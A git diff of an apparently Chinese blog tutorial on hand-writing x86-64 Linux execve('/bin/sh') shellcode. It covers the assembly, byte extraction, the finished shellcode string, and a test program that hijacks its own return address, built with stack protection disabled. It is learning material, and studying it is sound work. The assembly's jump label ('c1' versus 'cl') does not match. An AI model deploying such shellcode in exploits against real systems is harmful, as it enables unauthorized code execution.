@@ -6,7 +6,7 @@ categories:
 tags:
 - C++
 ---
-//Description: how to write shellcode
+//Description: how to write shellcode. 搜索到的基本上是x86的，少数x64的在自己的机器上也不管用，只有根据自己机器的实际情况自行写一遍。
 
 //Create Date: 2020-04-15 15:43:04
 
@@ -22,8 +22,10 @@ tags:
 #include <unistd.h>
 
 int main(int argc, char *argv[]) {
-	char *buf[] = {"/bin/sh",NULL};
-        execve("/bin/sh", buf, 0);
+	char *buf[2];
+	buf[0] = "/bin/sh";
+	buf[1] = NULL;
+        execve(buf[0], buf, 0);
         return 0;
 }
 ```
@@ -69,6 +71,8 @@ objdump -d shellcode > shellcode.s
  70e:   66 90                   xchg   %ax,%ax
 ```
 
+从这步开始就和搜索到的大部分文章不一样了
+
 ## 4. 重写汇编
 
 ```
@@ -76,20 +80,36 @@ objdump -d shellcode > shellcode.s
 .section .text
 .global _start
 _start:
-xor eax,eax;
-push eax    ;
-push 0x68732f6e
-push 0x69622f2f ;
-mov ebx,esp;
-push eax
-mov edx,esp;
-push ebx
-mov ecx,esp
-mov al,11
-int 0x80;
+jmp c1
+pp: popq %rcx #将字符串"/bin/sh"的地址存入rcx（通用寄存器），这里可以选择其它寄存器。
+pushq %rbp #接下来的三条指令是建立一个新的栈空间
+mov %rsp, %rbp
+subq $0x30, %rsp
+movq %rcx, -0x20(%rbp) #将字符串复制到栈
+movq $0x0,-0x18(%rbp) #创建调用exec时的参数name[1]，将它置0.
+mov $0, %edx
+lea -0x20(%rbp), %rsi #这是execve第二个参数，它需要**类型，所以用lea传送地址给rsi。
+mov -0x20(%rbp), %rdi #mov将字符串传给rdi，这是execve第一个参数。
+mov $59, %rax #这个59是execve的系统调用号，在/usr/include/asm/unistd_64.h里可以查询到.
+syscall #系统调用， 这个可以取代 int 0x80
+cl: call pp
 
 .ascii "/bin/sh"
 ```
+
+然而自己的机器上include里面并没有asm/unistd_64.h文件
+```
+// /usr/include/asm-generic/unistd.h
+607 #define __NR_execve 221
+608 __SC_COMP(__NR_execve, sys_execve, compat_sys_execve)
+```
+
+```
+// /usr/include/x86_64-linux-gnu/asm/unistd_64.h
+63 #define __NR_execve 59
+```
+
+[reference](https://www.jianshu.com/p/5d1b1eafca21)
 
 ## 5. 编译和连接
 
@@ -101,10 +121,40 @@ ld -o scode scode.o
 objdump反汇编scode，提取shellcode
 
 ```
-for i in $(objdump -d scode | grep “^ ” |cut -f2); do echo -n ‘\x’$i; done;
+for i in $(objdump -d scode | grep "^ " |cut -f2); do echo -n '\x'$i; done;
 ```
 
 最后得到shellcode
+
+```
+\xeb\x2b\x59\x55\x48\x89\xe5\x48\x83\xec\x30\x48\x89\x4d\xe0\x48\xc7\x45\xe8\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\x8d\x75\xe0\x48\x8b\x7d\xe0\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\xe8\xd0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
+```
+
+## 6. 验证
+
+```c++
+#include <stdio.h>
+
+unsigned char code[] = "\xeb\x2b\x59\x55\x48\x89\xe5\x48\x83\xec\x30\x48\x89\x4d\xe0\x48\xc7\x45\xe8\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\x8d\x75\xe0\x48\x8b\x7d\xe0\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\xe8\xd0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+void main(int argc, char *argv[])
+{ 
+    long *ret; 
+    ret = (long *)&ret + 2;  
+    (*ret) = (long)code;
+}
+```
+
+```
+gcc shellcodeTest.c -o shellcodeTest -fno-stack-protector -z execstack
+```
+
+能够正常运行
+```
+ity$ ./shellcodeTest 
+$ whoami
+channy
+```
 
 [back](/)
 
